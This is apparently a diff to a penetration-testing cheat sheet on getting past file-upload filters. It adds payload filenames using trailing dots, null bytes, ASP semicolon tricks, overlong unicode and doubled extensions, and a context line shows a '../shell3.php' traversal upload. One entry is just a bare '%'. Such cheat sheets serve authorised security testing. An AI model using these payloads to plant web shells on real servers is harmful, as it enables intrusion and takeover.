@@ -8,6 +8,27 @@ https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web
 ##### Reverse Double Extension
 `.php.jpg`
 
+##### Add trailing characters. 
+Some components will strip or ignore trailing whitespaces, dots, and suchlike: `exploit.php.`
+
+##### URL encoding
+%
+
+##### Null byte
+Adding `%00` to http requests creates miracles.
+`exploit.php%00.jpg`
+then open `/uploads/exploit.php%00.jpg` 
+`%00` ends parsing on it and downloads `exploit.php`
+
+##### Low level functions of C/C++
+`exploit.asp;.jpg` or `exploit.asp%00.jpg`
+
+###### Try using multibyte unicode characters,
+Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E`
+
+##### If extensions is stripped, double it
+`exploit.p.phphp`
+
 ##### Upload to different directory
 ```
 Content-Disposition: form-data; name="avatar"; filename="../shell3.php"
